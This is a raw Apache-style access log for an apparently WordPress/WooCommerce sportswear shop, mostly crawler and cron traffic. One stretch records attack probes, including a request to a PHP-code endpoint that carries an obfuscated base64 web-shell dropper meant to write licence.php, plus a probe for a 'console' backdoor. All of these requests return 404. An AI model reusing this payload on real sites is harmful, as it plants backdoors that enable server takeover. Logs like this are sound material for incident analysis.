157.55.39.99 - - [15/Dec/2019:05:04:20 +0100] "GET /wp-content/plugins/product-enquiry-for-woocommerce/css/wdm-jquery-ui.css?ver=5.2.5 HTTP/1.1" 200 30364 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.99 - - [15/Dec/2019:05:04:22 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/single-product.min.js?ver=3.6.4 HTTP/1.1" 200 6693 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.99 - - [15/Dec/2019:05:04:23 +0100] "GET /wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4 HTTP/1.1" 200 12482 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.99 - - [15/Dec/2019:05:04:24 +0100] "GET /wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4 HTTP/1.1" 200 18798 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.99 - - [15/Dec/2019:05:04:25 +0100] "GET /wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 HTTP/1.1" 200 7250 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:05:05:20 +0100] "POST /wp-cron.php?doing_wp_cron=1576382720.5068778991699218750000 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576382720.5068778991699218750000" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.80 - - [15/Dec/2019:05:05:16 +0100] "GET /producto/rinonera-deportiva-sa-7118/ HTTP/1.1" 200 91879 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:05:06:38 +0100] "POST /wp-cron.php?doing_wp_cron=1576382798.3382198810577392578125 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576382798.3382198810577392578125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.80 - - [15/Dec/2019:05:06:37 +0100] "GET /20-triatlon HTTP/1.1" 404 72266 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:04 +0100] "GET /wp-content/plugins/product-enquiry-for-woocommerce/js/contact.js?ver=5.2.5 HTTP/1.1" 200 8044 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:05 +0100] "GET /wp-content/plugins/woocommerce/assets/css/photoswipe/default-skin/default-skin.css?ver=3.6.4 HTTP/1.1" 200 11943 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:06 +0100] "GET /wp-content/plugins/woocommerce/assets/js/zoom/jquery.zoom.min.js?ver=1.7.21 HTTP/1.1" 200 2957 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:08 +0100] "GET /wp-includes/js/comment-reply.min.js?ver=5.2.5 HTTP/1.1" 200 2575 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:09 +0100] "GET /wp-includes/js/jquery/jquery.js HTTP/1.1" 200 97362 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:10 +0100] "GET /wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4 HTTP/1.1" 200 19277 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:11 +0100] "GET /wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4 HTTP/1.1" 200 3489 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:13 +0100] "GET /wp-includes/js/jquery/ui/position.min.js?ver=1.11.4 HTTP/1.1" 200 6869 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:05:10:14 +0100] "GET /wp-includes/js/underscore.min.js?ver=1.8.3 HTTP/1.1" 200 16527 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
189.202.87.144 - - [15/Dec/2019:05:27:01 +0100] "GET /wp-content/uploads/2019/04/Gorra-sport-6.png HTTP/1.1" 200 44623 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
181.36.206.145 - - [15/Dec/2019:05:28:16 +0100] "GET /wp-content/uploads/2019/04/Llavero-Metalico-Tenis-3.png HTTP/1.1" 200 46626 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15" "-"
217.76.130.90 - - [15/Dec/2019:05:28:43 +0100] "POST /wp-cron.php?doing_wp_cron=1576384123.1525139808654785156250 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576384123.1525139808654785156250" "WordPress/5.2.5; https://amazingsportwear.com" "-"
66.249.64.148 - - [15/Dec/2019:05:28:39 +0100] "GET /ciclismo/86-culoute-largo-ciclismo.html HTTP/1.1" 404 72313 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
217.76.130.90 - - [15/Dec/2019:05:29:56 +0100] "POST /wp-cron.php?doing_wp_cron=1576384196.5571110248565673828125 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576384196.5571110248565673828125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
207.46.13.13 - - [15/Dec/2019:05:29:55 +0100] "GET /producto/camiseta-tecnica-nath-action/ HTTP/1.1" 200 108819 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
186.77.203.8 - - [15/Dec/2019:05:48:40 +0100] "GET /wp-content/uploads/2019/04/Gorra-sport-6.png HTTP/1.1" 200 44623 "https://www.google.es/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
217.76.130.90 - - [15/Dec/2019:06:47:37 +0100] "POST /wp-cron.php?doing_wp_cron=1576388857.0094399452209472656250 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576388857.0094399452209472656250" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.99 - - [15/Dec/2019:06:47:32 +0100] "GET /producto/polo-tecnico-hombre-cif-t611-613-615/ HTTP/1.1" 200 102909 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.189.55 - - [15/Dec/2019:06:57:13 +0100] "GET /wp-includes/js/jquery/ui/button.min.js?ver=1.11.4 HTTP/1.1" 200 10941 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
207.46.13.13 - - [15/Dec/2019:06:57:33 +0100] "GET /wp-content/plugins/cookie-law-info/public/css/cookie-law-info-public.css?ver=1.7.6 HTTP/1.1" 200 6598 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:07:11:40 +0100] "POST /wp-cron.php?doing_wp_cron=1576390300.8624060153961181640625 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576390300.8624060153961181640625" "WordPress/5.2.5; https://amazingsportwear.com" "-"
66.249.64.144 - - [15/Dec/2019:07:11:39 +0100] "GET /robots.txt HTTP/1.1" 200 3939 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.144 - - [15/Dec/2019:07:11:41 +0100] "GET /etiqueta-producto/camiseta-plus-combinada/ HTTP/1.1" 200 51037 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
31.13.115.4 - - [15/Dec/2019:07:17:10 +0100] "GET /wp-content/uploads/2019/07/slider1.jpg HTTP/1.1" 206 247735 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
217.76.130.90 - - [15/Dec/2019:07:32:18 +0100] "POST /wp-cron.php?doing_wp_cron=1576391538.3131890296936035156250 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576391538.3131890296936035156250" "WordPress/5.2.5; https://amazingsportwear.com" "-"
31.13.115.7 - - [15/Dec/2019:07:32:17 +0100] "GET / HTTP/1.1" 200 125560 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.115.18 - - [15/Dec/2019:07:32:21 +0100] "GET /contacta-con-nosotros HTTP/1.1" 301 319 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.115.18 - - [15/Dec/2019:07:32:22 +0100] "GET /contacta-con-nosotros/ HTTP/1.1" 200 58161 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
217.76.130.90 - - [15/Dec/2019:07:33:57 +0100] "POST /wp-cron.php?doing_wp_cron=1576391637.2377519607543945312500 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576391637.2377519607543945312500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.30 - - [15/Dec/2019:07:33:56 +0100] "GET /robots.txt HTTP/1.1" 200 2297 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.30 - - [15/Dec/2019:07:33:58 +0100] "GET /robots.txt HTTP/1.1" 200 3939 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:07:34:24 +0100] "GET /wp-content/uploads/2019/03/epic-1.png HTTP/1.1" 200 119828 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:07:34:52 +0100] "POST /wp-cron.php?doing_wp_cron=1576391692.5490159988403320312500 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576391692.5490159988403320312500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
220.181.124.138 - - [15/Dec/2019:07:34:51 +0100] "GET /robots.txt HTTP/1.1" 200 394 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
220.181.124.138 - - [15/Dec/2019:07:34:53 +0100] "GET /robots.txt HTTP/1.1" 200 394 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
217.76.130.90 - - [15/Dec/2019:07:40:32 +0100] "POST /wp-cron.php?doing_wp_cron=1576392031.9516129493713378906250 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576392031.9516129493713378906250" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.252 - - [15/Dec/2019:07:40:30 +0100] "GET /producto/bolsa-tinsul/ HTTP/1.1" 200 77340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
189.202.70.200 - - [15/Dec/2019:07:41:35 +0100] "GET /wp-content/uploads/2019/04/SA-1070-4.png HTTP/1.1" 200 69427 "https://www.google.com.mx/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" "-"
217.76.130.90 - - [15/Dec/2019:07:48:20 +0100] "POST /wp-cron.php?doing_wp_cron=1576392500.9559099674224853515625 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576392500.9559099674224853515625" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.252 - - [15/Dec/2019:07:48:20 +0100] "GET /producto/gafas-de-sol-deportiva-eny-ni11g/ HTTP/1.1" 200 91046 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:07:49:36 +0100] "POST /wp-cron.php?doing_wp_cron=1576392576.7402679920196533203125 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576392576.7402679920196533203125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.252 - - [15/Dec/2019:07:49:36 +0100] "GET /producto/calcetin-deportivo-sublimado-bp-38040/ HTTP/1.1" 200 94486 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.99 - - [15/Dec/2019:07:58:49 +0100] "GET /wp-content/uploads/2017/03/aq-power-hombre-300x300.jpg HTTP/1.1" 200 73463 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.252 - - [15/Dec/2019:08:02:26 +0100] "GET /wp-includes/js/comment-reply.min.js?ver=5.2.5 HTTP/1.1" 200 5938 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.99 - - [15/Dec/2019:08:02:31 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/single-product.min.js?ver=3.6.4 HTTP/1.1" 200 10056 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.99 - - [15/Dec/2019:08:02:31 +0100] "GET /wp-includes/css/dist/block-library/style.min.css?ver=5.2.5 HTTP/1.1" 200 29660 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
207.46.13.13 - - [15/Dec/2019:08:03:05 +0100] "GET /wp-content/plugins/akismet/_inc/form.js?ver=4.1.2 HTTP/1.1" 200 4403 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:08:31:13 +0100] "POST /wp-cron.php?doing_wp_cron=1576395073.1365480422973632812500 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576395073.1365480422973632812500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
17.58.96.177 - - [15/Dec/2019:08:31:09 +0100] "GET /producto/toalla-absorvente-gymnasio/ HTTP/1.1" 200 103606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
217.76.130.90 - - [15/Dec/2019:08:40:59 +0100] "POST /wp-cron.php?doing_wp_cron=1576395659.0724780559539794921875 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576395659.0724780559539794921875" "WordPress/5.2.5; https://amazingsportwear.com" "-"
17.58.96.177 - - [15/Dec/2019:08:40:58 +0100] "GET /categoria-producto/accesorios/bidonesdeportivos/ HTTP/1.1" 200 75149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
217.76.130.90 - - [15/Dec/2019:08:43:24 +0100] "POST /wp-cron.php?doing_wp_cron=1576395804.4101591110229492187500 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576395804.4101591110229492187500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
217.76.130.90 - - [15/Dec/2019:08:43:24 +0100] "POST /wp-cron.php?doing_wp_cron=1576395804.4100620746612548828125 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576395804.4100620746612548828125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
217.76.130.90 - - [15/Dec/2019:08:43:24 +0100] "POST /wp-cron.php?doing_wp_cron=1576395804.4101569652557373046875 HTTP/1.1" 200 3355 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576395804.4101569652557373046875" "WordPress/5.2.5; https://amazingsportwear.com" "-"
173.252.83.1 - - [15/Dec/2019:08:43:23 +0100] "GET / HTTP/1.1" 200 125560 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
173.252.83.14 - - [15/Dec/2019:08:43:23 +0100] "GET / HTTP/1.1" 200 125530 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
173.252.83.10 - - [15/Dec/2019:08:43:23 +0100] "GET / HTTP/1.1" 200 125535 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
173.252.83.24 - - [15/Dec/2019:08:43:23 +0100] "GET / HTTP/1.1" 200 125565 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
207.46.13.13 - - [15/Dec/2019:08:53:17 +0100] "GET /wp-content/uploads/2019/04/Bid%C3%B3n-Iskan-6.png HTTP/1.1" 200 68775 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:08:56:15 +0100] "POST /wp-cron.php?doing_wp_cron=1576396575.4324219226837158203125 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576396575.4324219226837158203125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
207.46.13.13 - - [15/Dec/2019:08:56:13 +0100] "GET /ciclismo/88-manguito-brazo-ciclismo.html HTTP/1.1" 404 68076 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:08:59:23 +0100] "POST /wp-cron.php?doing_wp_cron=1576396763.3812830448150634765625 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576396763.3812830448150634765625" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.252 - - [15/Dec/2019:08:59:22 +0100] "GET /producto/calcetin-deportivo-sublimado-bp-38040/ HTTP/1.1" 200 94288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:09:14:15 +0100] "POST /wp-cron.php?doing_wp_cron=1576397655.5429809093475341796875 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576397655.5429809093475341796875" "WordPress/5.2.5; https://amazingsportwear.com" "-"
207.46.13.162 - - [15/Dec/2019:09:14:14 +0100] "GET /ofertas/ HTTP/1.1" 200 73403 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:09:20:02 +0100] "POST /wp-cron.php?doing_wp_cron=1576398002.6975679397583007812500 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576398002.6975679397583007812500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.252 - - [15/Dec/2019:09:20:02 +0100] "GET /producto/rinonera-elastica-dorsal-cif-g221/ HTTP/1.1" 200 95687 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:09:32:23 +0100] "POST /wp-cron.php?doing_wp_cron=1576398743.0379590988159179687500 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576398743.0379590988159179687500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
51.89.253.7 - - [15/Dec/2019:09:32:21 +0100] "POST /modules/megaproduct/ HTTP/1.1" 404 68037 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
51.89.253.7 - - [15/Dec/2019:09:32:24 +0100] "GET /modules/megaproduct/KTN.php HTTP/1.1" 404 68051 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
51.89.253.7 - - [15/Dec/2019:09:32:32 +0100] "GET /modules/bamegamenu/ajax_phpcode.php?code=fwrite(fopen($_SERVER%5B%27DOCUMENT_ROOT%27%5D.%22/licence.php%22,%22w+%22),%22%3C?php%20eval(base64_decode(%27CiBnb3RvIGRGcnVmOyBQeER4aTogaWYgKCRmaWxlc1siXHg2ZVx4NjFceDZkXHg2NSJdICE9ICcnKSB7ICRmdWxscGF0aCA9ICRfUkVRVUVTVFsiXDE2MFwxNDFceDc0XDE1MCJdIC4gJGZpbGVzWyJcMTU2XHg2MVwxNTVceDY1Il07IGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJGZpbGVzWyJcMTY0XDE1NVwxNjBcMTM3XDE1NlwxNDFcMTU1XDE0NSJdLCAkZnVsbHBhdGgpKSB7IGVjaG8gIlw3NFx4NjhceDMxXHgzZVx4M2NceDYxXHgyMFx4NjhceDcyXDE0NVwxNDZcNzVcNDd7JGZ1bGxwYXRofVw0N1w3NlwxMTdceDRiXHgyZFwxMDNceDZjXDE1MVx4NjNcMTUzXHgyMFx4NjhceDY1XDE2MlwxNDVceDIxXHgzY1x4MmZceDYxXDc2XHgzY1x4MmZceDY4XHgzMVw3NiI7IH0gfSBnb3RvIElfclkxOyBXWVdxajogJGZpbGVzID0gQCRfRklMRVNbIlx4NjZceDY5XHg2Y1x4NjVceDczIl07IGdvdG8gUHhEeGk7IGRGcnVmOiBlY2hvICJceDZiXHg2OVx4NmNceDZjXHg1Zlx4NzRcMTUwXHg2NVx4NWZcMTU2XHg2NVx4NzQiOyBnb3RvIFdZV3FqOyBJX3JZMTogZWNobyAiXHgzY1wxNTBceDc0XHg2ZFwxNTRcNzZcNzRcMTUwXDE0NVx4NjFcMTQ0XHgzZVx4M2NceDc0XHg2OVwxNjRceDZjXDE0NVx4M2VcMTI1XHg3MFwxNTRceDZmXHg2MVwxNDRcNDBcMTQ2XHg2OVx4NmNcMTQ1XDE2M1x4MmVcNTZceDJlXHgzY1x4MmZceDc0XDE1MVwxNjRceDZjXHg2NVw3Nlw3NFx4MmZcMTUwXDE0NVwxNDFcMTQ0XHgzZVw3NFx4NjJceDZmXDE0NFwxNzFcNzZceDNjXDE0NlwxNTdceDcyXHg2ZFx4MjBceDZkXDE0NVwxNjRceDY4XDE1N1x4NjRcNzVceDUwXDExN1wxMjNceDU0XDQwXHg2NVwxNTZcMTQzXDE2NFwxNzFceDcwXDE0NVw3NVw0Mlx4NmRcMTY1XHg2Y1wxNjRcMTUxXHg3MFx4NjFceDcyXDE2NFx4MmZcMTQ2XDE1N1x4NzJceDZkXHgyZFx4NjRceDYxXHg3NFx4NjFcNDJceDIwXHg2MVwxNDNcMTY0XHg2OVx4NmZcMTU2XHgzZFw0Mlx4MjJceDNlXDc0XHg2OVwxNTZceDcwXDE2NVx4NzRcNDBceDc0XHg3OVx4NzBcMTQ1XDc1XDE2NFx4NjVcMTcwXHg3NFx4MjBceDZlXDE0MVx4NmRcMTQ1XDc1XDE2MFx4NjFceDc0XHg2OFx4M2VceDNjXDE1MVx4NmVceDcwXDE2NVwxNjRceDIwXDE2NFwxNzFcMTYwXHg2NVw3NVw0Mlx4NjZcMTUxXHg2Y1wxNDVceDIyXDQwXHg2ZVwxNDFceDZkXHg2NVw3NVx4MjJcMTQ2XDE1MVx4NmNcMTQ1XHg3M1w0Mlx4M2VceDNjXDE1MVwxNTZceDcwXDE2NVx4NzRceDIwXDE2NFwxNzFceDcwXDE0NVw3NVwxNjNceDc1XDE0Mlx4NmRceDY5XDE2NFw0MFwxNjZcMTQxXDE1NFx4NzVcMTQ1XHgzZFw0MlwxMjVceDcwXDQyXHgzZVx4M2NcNTdceDY2XHg2ZlwxNjJcMTU1XHgzZVx4M2NcNTdceDYyXDE1N1wxNDRceDc5XDc2XDc0XHgyZlwxNTBcMTY0XHg2ZFx4NmNceDNlIjsgZ290byB3QVZvajsgd0FWb2o6IA==%27));%20?%3E%22) HTTP/1.1" 404 558 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
51.89.253.7 - - [15/Dec/2019:09:32:33 +0100] "GET /licence.php HTTP/1.1" 404 68002 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
217.76.130.90 - - [15/Dec/2019:09:37:11 +0100] "POST /wp-cron.php?doing_wp_cron=1576399031.8722488880157470703125 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576399031.8722488880157470703125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.252 - - [15/Dec/2019:09:37:11 +0100] "GET /categoria-producto/deportes/baloncesto/ HTTP/1.1" 200 62994 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:09:38:36 +0100] "POST /wp-cron.php?doing_wp_cron=1576399116.4644498825073242187500 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576399116.4644498825073242187500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
87.98.165.248 - - [15/Dec/2019:09:38:35 +0100] "GET /wp-includes/class.wp.php?console HTTP/1.1" 404 68013 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "-"
217.76.130.90 - - [15/Dec/2019:09:38:37 +0100] "POST /wp-admin/admin-ajax.php?action=wp_1_wc_privacy_cleanup&nonce=b1b67ecd19 HTTP/1.1" 200 3707 "https://amazingsportwear.com/wp-admin/admin-ajax.php?action=wp_1_wc_privacy_cleanup&nonce=b1b67ecd19" "WordPress/5.2.5; https://amazingsportwear.com" "-"
217.76.130.90 - - [15/Dec/2019:09:41:30 +0100] "POST /wp-cron.php?doing_wp_cron=1576399290.3151819705963134765625 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576399290.3151819705963134765625" "WordPress/5.2.5; https://amazingsportwear.com" "-"
17.58.96.177 - - [15/Dec/2019:09:41:29 +0100] "GET /categoria-producto/deportes/atletismo/ HTTP/1.1" 200 61346 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
217.76.130.90 - - [15/Dec/2019:09:45:15 +0100] "POST /wp-cron.php?doing_wp_cron=1576399515.2395679950714111328125 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576399515.2395679950714111328125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
66.249.64.144 - - [15/Dec/2019:09:45:14 +0100] "GET /producto/gorra-sport/ HTTP/1.1" 200 102726 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
217.76.130.90 - - [15/Dec/2019:09:46:56 +0100] "POST /wp-cron.php?doing_wp_cron=1576399616.6349699497222900390625 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576399616.6349699497222900390625" "WordPress/5.2.5; https://amazingsportwear.com" "-"
157.55.39.30 - - [15/Dec/2019:09:46:55 +0100] "GET /robots.txt HTTP/1.1" 200 432 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:09:47:31 +0100] "POST /wp-cron.php?doing_wp_cron=1576399651.1708490848541259765625 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576399651.1708490848541259765625" "WordPress/5.2.5; https://amazingsportwear.com" "-"
207.46.13.13 - - [15/Dec/2019:09:47:30 +0100] "GET /producto/calcetin-deportivo-coolmax-cp-coolmax/ HTTP/1.1" 200 95187 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:10:05:15 +0100] "POST /wp-cron.php?doing_wp_cron=1576400715.5733859539031982421875 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576400715.5733859539031982421875" "WordPress/5.2.5; https://amazingsportwear.com" "-"
104.222.33.138 - - [15/Dec/2019:10:05:13 +0100] "GET / HTTP/1.1" 301 336 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" "-"
